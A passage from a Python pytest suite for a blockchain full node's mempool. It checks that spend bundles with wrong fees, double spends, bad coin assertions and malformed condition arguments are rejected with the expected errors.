MempoolInclusionStatus.FAILED\n        assert err == Err.ASSERT_ANNOUNCE_CONSUMED_FAILED\n    @pytest.mark.asyncio\n    async def test_invalid_puzzle_announcement_rejected_two(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        def test_fun(coin_1: Coin, coin_2: Coin):\n            announce = Announcement(coin_2.puzzle_hash, b\"test\")\n            cvp = ConditionWithArgs(ConditionOpcode.ASSERT_PUZZLE_ANNOUNCEMENT, [announce.name()])\n            dic = {cvp.opcode: [cvp]}\n            cvp2 = ConditionWithArgs(\n                ConditionOpcode.CREATE_COIN_ANNOUNCEMENT,\n                [b\"test\"],\n            )\n            dic2 = {cvp.opcode: [cvp2]}\n            spend_bundle1 = generate_test_spend_bundle(coin_1, dic)\n            spend_bundle2 = generate_test_spend_bundle(coin_2, dic2)\n            return SpendBundle.aggregate([spend_bundle1, spend_bundle2])\n        blocks, bundle, status, err = await self.condition_tester2(two_nodes, test_fun)\n        mempool_bundle = full_node_1.full_node.mempool_manager.get_spendbundle(bundle.name())\n        assert mempool_bundle is None\n        assert status == MempoolInclusionStatus.FAILED\n        assert err == Err.ASSERT_ANNOUNCE_CONSUMED_FAILED\n    @pytest.mark.asyncio\n    async def test_assert_fee_condition(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        cvp = ConditionWithArgs(ConditionOpcode.RESERVE_FEE, [int_to_bytes(10)])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic, fee=10)\n        mempool_bundle = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert mempool_bundle is not None\n        assert status == MempoolInclusionStatus.SUCCESS\n        assert err is None\n    @pytest.mark.asyncio\n    async def test_assert_fee_condition_garbage(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        cvp = ConditionWithArgs(ConditionOpcode.RESERVE_FEE, [int_to_bytes(10), b\"garbage\"])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic, fee=10)\n        mempool_bundle = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert mempool_bundle is not None\n        assert status == MempoolInclusionStatus.SUCCESS\n        assert err is None\n    @pytest.mark.asyncio\n    async def test_assert_fee_condition_missing_arg(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        cvp = ConditionWithArgs(ConditionOpcode.RESERVE_FEE, [])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic, fee=10)\n        assert status == MempoolInclusionStatus.FAILED\n        assert err == Err.GENERATOR_RUNTIME_ERROR\n    @pytest.mark.asyncio\n    async def test_assert_fee_condition_negative_fee(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        cvp = ConditionWithArgs(ConditionOpcode.RESERVE_FEE, [int_to_bytes(-1)])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic, fee=10)\n        assert status == MempoolInclusionStatus.FAILED\n        assert err == Err.RESERVE_FEE_CONDITION_FAILED\n        blocks = bt.get_consecutive_blocks(\n            1, block_list_input=blocks, guarantee_transaction_block=True, transaction_data=spend_bundle1\n        )\n        assert full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name()) is None\n        assert (await full_node_1.full_node.blockchain.receive_block(blocks[-1]))[1] == Err.RESERVE_FEE_CONDITION_FAILED\n    @pytest.mark.asyncio\n    async def test_assert_fee_condition_fee_too_large(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        cvp = ConditionWithArgs(ConditionOpcode.RESERVE_FEE, [int_to_bytes(2 ** 64)])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic, fee=10)\n        assert status == MempoolInclusionStatus.FAILED\n        assert err == Err.RESERVE_FEE_CONDITION_FAILED\n        blocks = bt.get_consecutive_blocks(\n            1, block_list_input=blocks, guarantee_transaction_block=True, transaction_data=spend_bundle1\n        )\n        assert full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name()) is None\n        assert (await full_node_1.full_node.blockchain.receive_block(blocks[-1]))[1] == Err.RESERVE_FEE_CONDITION_FAILED\n    @pytest.mark.asyncio\n    async def test_assert_fee_condition_wrong_fee(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        cvp = ConditionWithArgs(ConditionOpcode.RESERVE_FEE, [int_to_bytes(10)])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic, fee=9)\n        mempool_bundle = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert mempool_bundle is None\n        assert status == MempoolInclusionStatus.FAILED\n        assert err == Err.RESERVE_FEE_CONDITION_FAILED\n    @pytest.mark.asyncio\n    async def test_stealing_fee(self, two_nodes):\n        reward_ph = WALLET_A.get_new_puzzlehash()\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        blocks = await full_node_1.get_all_full_blocks()\n        start_height = blocks[-1].height\n        blocks = bt.get_consecutive_blocks(\n            5,\n            block_list_input=blocks,\n            guarantee_transaction_block=True,\n            farmer_reward_puzzle_hash=reward_ph,\n            pool_reward_puzzle_hash=reward_ph,\n        )\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        peer = await connect_and_get_peer(server_1, server_2)\n        for block in blocks:\n            await full_node_1.full_node.respond_block(full_node_protocol.RespondBlock(block))\n        await time_out_assert(60, node_height_at_least, True, full_node_1, start_height + 5)\n        receiver_puzzlehash = BURN_PUZZLE_HASH\n        cvp = ConditionWithArgs(ConditionOpcode.RESERVE_FEE, [int_to_bytes(10)])\n        dic = {cvp.opcode: [cvp]}\n        fee = 9\n        coin_1 = list(blocks[-2].get_included_reward_coins())[0]\n        coin_2 = None\n        for coin in list(blocks[-1].get_included_reward_coins()):\n            if coin.amount == coin_1.amount:\n                coin_2 = coin\n        spend_bundle1 = generate_test_spend_bundle(coin_1, dic, uint64(fee))\n        steal_fee_spendbundle = WALLET_A.generate_signed_transaction(\n            coin_1.amount + fee - 4, receiver_puzzlehash, coin_2\n        )\n        assert spend_bundle1 is not None\n        assert steal_fee_spendbundle is not None\n        combined = SpendBundle.aggregate([spend_bundle1, steal_fee_spendbundle])\n        assert combined.fees() == 4\n        tx1: full_node_protocol.RespondTransaction = full_node_protocol.RespondTransaction(spend_bundle1)\n        status, err = await respond_transaction(full_node_1, tx1, peer)\n        mempool_bundle = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert mempool_bundle is None\n        assert status == MempoolInclusionStatus.FAILED\n        assert err == Err.RESERVE_FEE_CONDITION_FAILED\n    @pytest.mark.asyncio\n    async def test_double_spend_same_bundle(self, two_nodes):\n        reward_ph = WALLET_A.get_new_puzzlehash()\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        blocks = await full_node_1.get_all_full_blocks()\n        start_height = blocks[-1].height\n        blocks = bt.get_consecutive_blocks(\n            3,\n            block_list_input=blocks,\n            guarantee_transaction_block=True,\n            farmer_reward_puzzle_hash=reward_ph,\n            pool_reward_puzzle_hash=reward_ph,\n        )\n        peer = await connect_and_get_peer(server_1, server_2)\n        for block in blocks:\n            await full_node_1.full_node.respond_block(full_node_protocol.RespondBlock(block))\n        await time_out_assert(60, node_height_at_least, True, full_node_1, start_height + 3)\n        coin = list(blocks[-1].get_included_reward_coins())[0]\n        spend_bundle1 = generate_test_spend_bundle(coin)\n        assert spend_bundle1 is not None\n        spend_bundle2 = generate_test_spend_bundle(\n            coin,\n            new_puzzle_hash=BURN_PUZZLE_HASH_2,\n        )\n        assert spend_bundle2 is not None\n        spend_bundle_combined = SpendBundle.aggregate([spend_bundle1, spend_bundle2])\n        tx: full_node_protocol.RespondTransaction = full_node_protocol.RespondTransaction(spend_bundle_combined)\n        status, err = await respond_transaction(full_node_1, tx, peer)\n        sb = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle_combined.name())\n        assert sb is None\n        assert status == MempoolInclusionStatus.FAILED\n        assert err == Err.DOUBLE_SPEND\n    @pytest.mark.asyncio\n    async def test_agg_sig_condition(self, two_nodes):\n        reward_ph = WALLET_A.get_new_puzzlehash()\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        blocks = await full_node_1.get_all_full_blocks()\n        start_height = blocks[-1].height\n        blocks = bt.get_consecutive_blocks(\n            3,\n            block_list_input=blocks,\n            guarantee_transaction_block=True,\n            farmer_reward_puzzle_hash=reward_ph,\n            pool_reward_puzzle_hash=reward_ph,\n        )\n        for block in blocks:\n            await full_node_1.full_node.respond_block(full_node_protocol.RespondBlock(block))\n        await time_out_assert(60, node_height_at_least, True, full_node_1, start_height + 3)\n        coin = list(blocks[-1].get_included_reward_coins())[0]\n        spend_bundle_0 = generate_test_spend_bundle(coin)\n        unsigned: List[CoinSolution] = spend_bundle_0.coin_solutions\n        assert len(unsigned) == 1\n        coin_solution: CoinSolution = unsigned[0]\n        err, con, cost = conditions_for_solution(coin_solution.puzzle_reveal, coin_solution.solution, INFINITE_COST)\n        assert con is not None\n    @pytest.mark.asyncio\n    async def test_correct_my_parent(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        blocks = await full_node_1.get_all_full_blocks()\n        coin = list(blocks[-1].get_included_reward_coins())[0]\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_MY_PARENT_ID, [coin.parent_coin_info])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic, coin=coin)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is spend_bundle1\n        assert status == MempoolInclusionStatus.SUCCESS\n        assert err is None\n    @pytest.mark.asyncio\n    async def test_my_parent_garbage(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        blocks = await full_node_1.get_all_full_blocks()\n        coin = list(blocks[-1].get_included_reward_coins())[0]\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_MY_PARENT_ID, [coin.parent_coin_info, b\"garbage\"])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic, coin=coin)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is spend_bundle1\n        assert status == MempoolInclusionStatus.SUCCESS\n        assert err is None\n    @pytest.mark.asyncio\n    async def test_my_parent_missing_arg(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        blocks = await full_node_1.get_all_full_blocks()\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_MY_PARENT_ID, [])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is None\n        assert status == MempoolInclusionStatus.FAILED\n        assert err == Err.GENERATOR_RUNTIME_ERROR\n    @pytest.mark.asyncio\n    async def test_invalid_my_parent(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        blocks = await full_node_1.get_all_full_blocks()\n        coin = list(blocks[-1].get_included_reward_coins())[0]\n        coin_2 = list(blocks[-2].get_included_reward_coins())[0]\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_MY_PARENT_ID, [coin_2.parent_coin_info])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic, coin=coin)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is None\n        assert status == MempoolInclusionStatus.FAILED\n        assert err == Err.ASSERT_MY_PARENT_ID_FAILED\n    @pytest.mark.asyncio\n    async def test_correct_my_puzhash(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        blocks = await full_node_1.get_all_full_blocks()\n        coin = list(blocks[-1].get_included_reward_coins())[0]\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_MY_PUZZLEHASH, [coin.puzzle_hash])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic, coin=coin)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is spend_bundle1\n        assert status == MempoolInclusionStatus.SUCCESS\n        assert err is None\n    @pytest.mark.asyncio\n    async def test_my_puzhash_garbage(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        blocks = await full_node_1.get_all_full_blocks()\n        coin = list(blocks[-1].get_included_reward_coins())[0]\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_MY_PUZZLEHASH, [coin.puzzle_hash, b\"garbage\"])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic, coin=coin)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is spend_bundle1\n        assert status == MempoolInclusionStatus.SUCCESS\n        assert err is None\n    @pytest.mark.asyncio\n    async def test_my_puzhash_missing_arg(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        blocks = await full_node_1.get_all_full_blocks()\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_MY_PUZZLEHASH, [])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is None\n        assert status == MempoolInclusionStatus.FAILED\n        assert err == Err.GENERATOR_RUNTIME_ERROR\n    @pytest.mark.asyncio\n    async def test_invalid_my_puzhash(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        blocks = await full_node_1.get_all_full_blocks()\n        coin = list(blocks[-1].get_included_reward_coins())[0]\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_MY_PUZZLEHASH, [Program.to([]).get_tree_hash()])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic, coin=coin)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is None\n        assert status == MempoolInclusionStatus.FAILED\n        assert err == Err.ASSERT_MY_PUZZLEHASH_FAILED\n    @pytest.mark.asyncio\n    async def test_correct_my_amount(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        blocks = await full_node_1.get_all_full_blocks()\n        coin = list(blocks[-1].get_included_reward_coins())[0]\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_MY_AMOUNT, [int_to_bytes(coin.amount)])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic, coin=coin)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is spend_bundle1\n        assert status == MempoolInclusionStatus.SUCCESS\n        assert err is None\n    @pytest.mark.asyncio\n    async def test_my_amount_garbage(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        blocks = await full_node_1.get_all_full_blocks()\n        coin = list(blocks[-1].get_included_reward_coins())[0]\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_MY_AMOUNT, [int_to_bytes(coin.amount), b\"garbage\"])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic, coin=coin)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is spend_bundle1\n        assert status == MempoolInclusionStatus.SUCCESS\n        assert err is None\n    @pytest.mark.asyncio\n    async def test_my_amount_missing_arg(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        blocks = await full_node_1.get_all_full_blocks()\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_MY_AMOUNT, [])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is None\n        assert status == MempoolInclusionStatus.FAILED\n        assert err == Err.GENERATOR_RUNTIME_ERROR\n    @pytest.mark.asyncio\n    async def test_invalid_my_amount(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        blocks = await full_node_1.get_all_full_blocks()\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_MY_AMOUNT, [int_to_bytes(1000)])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is None\n        assert status == MempoolInclusionStatus.FAILED\n        assert err == Err.ASSERT_MY_AMOUNT_FAILED\n    @pytest.mark.asyncio\n    async def test_negative_my_amount(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        blocks = await full_node_1.get_all_full_blocks()\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_MY_AMOUNT, [int_to_bytes(-1)])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is None\n        assert status == MempoolInclusionStatus.FAILED\n        assert err == Err.ASSERT_MY_AMOUNT_FAILED\n    @pytest.mark.asyncio\n    async def test_my_amount_too_large(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        blocks = await full_node_1.get_all_full_blocks()\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_MY_AMOUNT, [int_to_bytes(2 ** 64)])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is None\n        assert status == MempoolInclusionStatus.FAILED\n        assert err == Err.ASSERT_MY_AMOUNT_FAILED\n    @pytest.mark.asyncio\n    async def test_unknown_condition(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        cvp = ConditionWithArgs(ConditionOpcode.UNKNOWN, [])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is None\n        assert status == MempoolInclusionStatus.FAILED\n        assert err == Err.INVALID_CONDITION\nclass TestConditionParser:\n    @pytest.mark.parametrize(\"safe_mode\", [True, False])\n    def test_parse_condition_agg_sig(self, safe_mode: bool):\n        valid_pubkey = b\"b\" * 48\n        short_pubkey = b\"b\" * 47\n        long_pubkey = b\"b\" * 49\n        valid_message = b\"a\" * 1024\n        long_message = b\"a\" * 1025\n        empty_message = b\"\"\n        for condition_code in [ConditionOpcode.AGG_SIG_UNSAFE, ConditionOpcode.AGG_SIG_ME]:\n            cost, args = parse_condition_args(SExp.to([valid_pubkey, valid_message]), condition_code, safe_mode)\n            assert cost == ConditionCost.AGG_SIG.value\n            assert args == [valid_pubkey, valid_message]\n            with pytest.raises(ValidationError):\n                cost, args = parse_condition_args(SExp.to([valid_pubkey, long_message]), condition_code, safe_mode)\n            cost, args = parse_condition_args(SExp.to([valid_pubkey, empty_message]), condition_code, safe_mode)\n            assert cost == ConditionCost.AGG_SIG.value\n            assert args == [valid_pubkey, empty_message]\n            with pytest.raises(ValidationError):\n                cost, args = parse_condition_args(SExp.to([short_pubkey, valid_message]), condition_code, safe_mode)\n            with pytest.raises(ValidationError):\n                cost, args = parse_condition_args(SExp.to([long_pubkey, valid_message]), condition_code, safe_mode)\n            with pytest.raises(EvalError):\n                cost, args = parse_condition_args(SExp.to([valid_pubkey]), condition_code, safe_mode)\n            with pytest.raises(EvalError):\n                cost, args = parse_condition_args(SExp.to([]), condition_code, safe_mode)\n            cost, args = parse_condition_args(\n                SExp.to([valid_pubkey, valid_message, b\"garbage\"]), condition_code, safe_mode\n            )\n            assert cost == ConditionCost.AGG_SIG.value\n            assert args == [valid_pubkey, valid_message]\n    @pytest.mark.parametrize(\"safe_mode\", [True, False])\n    def test_parse_condition_create_coin(self, safe_mode: bool):\n        valid_hash = b\"b\" * 32\n        short_hash = b\"b\" * 31\n        long_hash = b\"b\" * 33\n        valid_amount = int_to_bytes(1000000000)\n        large_amount = int_to_bytes(2 ** 64)\n        leading_zeros_amount = bytes([0] * 100) + int_to_bytes(1000000000)\n        negative_amount = int_to_bytes(-1000)\n        large_negative_amount = bytes([0xFF] * 100) + int_to_bytes(-1)\n        cost, args = parse_condition_args(SExp.to([valid_hash, valid_amount]), ConditionOpcode.CREATE_COIN, safe_mode)\n        assert cost == ConditionCost.CREATE_COIN.value\n        assert args == [valid_hash, valid_amount]\n        if safe_mode:\n            with pytest.raises(ValidationError):\n                parse_condition_args(\n                    SExp.to([valid_hash, leading_zeros_amount]), ConditionOpcode.CREATE_COIN, safe_mode\n                )\n        else:\n            cost, args = parse_condition_args(\n                SExp.to([valid_hash, leading_zeros_amount]), ConditionOpcode.CREATE_COIN, safe_mode\n            )\n            assert cost == ConditionCost.CREATE_COIN.value\n            assert args == [valid_hash, valid_amount]\n        with pytest.raises(ValidationError):\n            cost, args = parse_condition_args(\n                SExp.to([valid_hash, large_amount]), ConditionOpcode.CREATE_COIN, safe_mode\n            )\n        with pytest.raises(ValidationError):\n            cost, args = parse_condition_args(\n                SExp.to([short_hash, valid_amount]), ConditionOpcode.CREATE_COIN, safe_mode\n            )\n        with pytest.raises(ValidationError):\n            cost, args = parse_condition_args(\n                SExp.to([long_hash, valid_amount]), ConditionOpcode.CREATE_COIN, safe_mode\n            )\n        with pytest.raises(ValidationError):\n            cost, args = parse_condition_args(\n                SExp.to([valid_hash, negative_amount]), ConditionOpcode.CREATE_COIN, safe_mode\n            )\n        with pytest.raises(ValidationError):\n            cost, args = parse_condition_args(\n                SExp.to([valid_hash, large_negative_amount]), ConditionOpcode.CREATE_COIN, safe_mode\n            )\n        with pytest.raises(EvalError):\n            cost, args = parse_condition_args(SExp.to([valid_hash]), ConditionOpcode.CREATE_COIN, safe_mode)\n        with pytest.raises(EvalError):\n            cost, args = parse_condition_args(SExp.to([]), ConditionOpcode.CREATE_COIN, safe_mode)\n        cost, args = parse_condition_args(\n            SExp.to([valid_hash, valid_amount, b\"garbage\"]), ConditionOpcode.CREATE_COIN, safe_mode\n        )\n        assert cost == ConditionCost.CREATE_COIN.value\n        assert args == [valid_hash, valid_amount]\n    @pytest.mark.parametrize(\"safe_mode\", [True, False])\n    def test_parse_condition_seconds(self, safe_mode: bool):\n        valid_timestamp = int_to_bytes(100)\n        leading_zeros_timestamp = bytes([0] * 100) + int_to_bytes(100)\n        negative_timestamp = int_to_bytes(-100)\n        large_negative_timestamp = bytes([0xFF] * 100) + int_to_bytes(-1)\n        for condition_code in [ConditionOpcode.ASSERT_SECONDS_ABSOLUTE, ConditionOpcode.ASSERT_SECONDS_RELATIVE]:\n            cost, args = parse_condition_args(SExp.to([valid_timestamp]), condition_code, safe_mode)\n            assert cost == 0\n            assert args == [valid_timestamp]\n            if safe_mode:\n                with pytest.raises(ValidationError):\n                    parse_condition_args(SExp.to([leading_zeros_timestamp]), condition_code, safe_mode)\n            else:\n                cost, args = parse_condition_args(SExp.to([leading_zeros_timestamp]), condition_code, safe_mode)\n                assert cost == 0\n                assert args == [valid_timestamp]\n            cost, args = parse_condition_args(SExp.to([negative_timestamp]), condition_code, safe_mode)\n            assert cost == 0\n            assert args is None\n            cost, args = parse_condition_args(SExp.to([large_negative_timestamp]), condition_code, safe_mode)\n            assert cost == 0\n            assert args is None\n            cost, args = parse_condition_args(SExp.to([valid_timestamp, b\"garbage\"]), condition_code, safe_mode)\n            assert cost == 0\n            assert args == [valid_timestamp]\n            with pytest.raises(EvalError):\n                cost, args = parse_condition_args(SExp.to([]), condition_code, safe_mode)\n    @pytest.mark.parametrize(\"safe_mode\", [True, False])\n    def test_parse_condition_height(self, safe_mode: bool):\n        valid_height = int_to_bytes(100)\n        leading_zeros_height = bytes([0] * 100) + int_to_bytes(100)\n        negative_height = int_to_bytes(-100)\n        large_negative_height = bytes([0xFF] * 100) + int_to_bytes(-1)\n        for condition_code in [ConditionOpcode.ASSERT_HEIGHT_ABSOLUTE, ConditionOpcode.ASSERT_HEIGHT_RELATIVE]:\n            cost, args = parse_condition_args(SExp.to([valid_height]), condition_code, safe_mode)\n            assert cost == 0\n            assert args == [valid_height]\n            if safe_mode:\n                with pytest.raises(ValidationError):\n                    parse_condition_args(SExp.to([leading_zeros_height]), condition_code, safe_mode)\n            else:\n                cost, args = parse_condition_args(SExp.to([leading_zeros_height]), condition_code, safe_mode)\n                assert cost == 0\n                assert args == [valid_height]\n            cost, args = parse_condition_args(SExp.to([negative_height]), condition_code, safe_mode)\n            assert cost == 0\n            assert args is None\n            cost, args = parse_condition_args(SExp.to([large_negative_height]), condition_code, safe_mode)\n            assert cost == 0\n            assert args is None\n            cost, args = parse_condition_args(SExp.to([valid_height, b\"garbage\"]), condition_code, safe_mode)\n            assert cost == 0\n            assert args == [valid_height]\n            with pytest.raises(EvalError):\n                cost, args = parse_condition_args(SExp.to([]), condition_code, safe_mode)\n    @pytest.mark.parametrize(\"safe_mode\", [True, False])\n    def test_parse_condition_coin_id(self, safe_mode: bool):\n        valid_coin_id = b\"a\" * 32\n        short_coin_id = b\"a\" * 31\n        long_coin_id = b\"a\" * 33\n        for condition_code in [ConditionOpcode.ASSERT_MY_COIN_ID, ConditionOpcode.ASSERT_MY_PARENT_ID]:\n            cost, args = parse_condition_args(SExp.to([valid_coin_id]), condition_code, safe_mode)\n            assert cost == 0\n            assert args == [valid_coin_id]\n            with pytest.raises(ValidationError):\n                cost, args = parse_condition_args(SExp.to([short_coin_id]), condition_code, safe_mode)\n            with pytest.raises(ValidationError):\n                cost, args = parse_condition_args(SExp.to([long_coin_id]), condition_code, safe_mode)\n            cost, args = parse_condition_args(SExp.to([valid_coin_id, b\"garbage\"]), condition_code, safe_mode)\n            assert cost == 0\n            assert args == [valid_coin_id]\n            with pytest.raises(EvalError):\n                cost, args = parse_condition_args(SExp.to([]), condition_code, safe_mode)\n    @pytest.mark.parametrize(\"safe_mode\", [True, False])\n    def test_parse_condition_fee(self, safe_mode: bool):\n        valid_fee = int_to_bytes(100)\n        leading_zeros_fee = bytes([0] * 100) + int_to_bytes(100)\n        negative_fee = int_to_bytes(-100)\n        large_negative_fee = bytes([0xFF] * 100) + int_to_bytes(-1)\n        large_fee = int_to_bytes(2 ** 64)\n        cost, args = parse_condition_args(SExp.to([valid_fee]), ConditionOpcode.RESERVE_FEE, safe_mode)\n        assert cost == 0\n        assert args == [valid_fee]\n        if safe_mode:\n            with pytest.raises(ValidationError):\n                parse_condition_args(SExp.to([leading_zeros_fee]), ConditionOpcode.RESERVE_FEE, safe_mode)\n        else:\n            cost, args = parse_condition_args(SExp.to([leading_zeros_fee]), ConditionOpcode.RESERVE_FEE, safe_mode)\n            assert cost == 0\n            assert args == [valid_fee]\n        with pytest.raises(ValidationError):\n            cost, args = parse_condition_args(SExp.to([negative_fee]), ConditionOpcode.RESERVE_FEE, safe_mode)\n        with pytest.raises(ValidationError):\n            cost, args = parse_condition_args(SExp.to([large_fee]), ConditionOpcode.RESERVE_FEE, safe_mode)\n        with pytest.raises(ValidationError):\n            cost, args = parse_condition_args(SExp.to([large_negative_fee]), ConditionOpcode.RESERVE_FEE, safe_mode)\n        cost, args = parse_condition_args(SExp.to([valid_fee, b\"garbage\"]), ConditionOpcode.RESERVE_FEE, safe_mode)\n        assert cost == 0\n        assert args == [valid_fee]\n        with pytest.raises(EvalError):\n            cost, args = parse_condition_args(SExp.to([]), ConditionOpcode.RESERVE_FEE, safe_mode)\n    @pytest.mark.parametrize(\"safe_mode\", [True, False])\n    def test_parse_condition_create_announcement(self, safe_mode: bool):\n        valid_msg = b\"a\" * 1024\n        long_msg = b\"a\" * 1025\n        empty_msg = b\"\"\n        for condition_code in [ConditionOpcode.CREATE_COIN_ANNOUNCEMENT, ConditionOpcode.CREATE_PUZZLE_ANNOUNCEMENT]:\n            cost, args = parse_condition_args(SExp.to([valid_msg]), condition_code, safe_mode)\n            assert cost == 0\n            assert args == [valid_msg]\n            cost, args = parse_condition_args(SExp.to([empty_msg]), condition_code, safe_mode)\n            assert cost == 0\n            assert args == [empty_msg]\n            with pytest.raises(ValidationError):\n                cost, args = parse_condition_args(SExp.to([long_msg]), condition_code, safe_mode)\n            with pytest.raises(EvalError):\n                cost, args = parse_condition_args(SExp.to([]), condition_code, safe_mode)\n    @pytest.mark.parametrize(\"safe_mode\", [True, False])\n    def test_parse_condition_assert_announcement(self, safe_mode: bool):\n        valid_hash = b\"b\" * 32\n        short_hash = b\"b\" * 31\n        long_hash = b\"b\" * 33\n        for condition_code in [\n            ConditionOpcode.ASSERT_COIN_ANNOUNCEMENT,\n            ConditionOpcode.ASSERT_PUZZLE_ANNOUNCEMENT,\n            ConditionOpcode.ASSERT_MY_PUZZLEHASH,\n        ]:\n            cost, args = 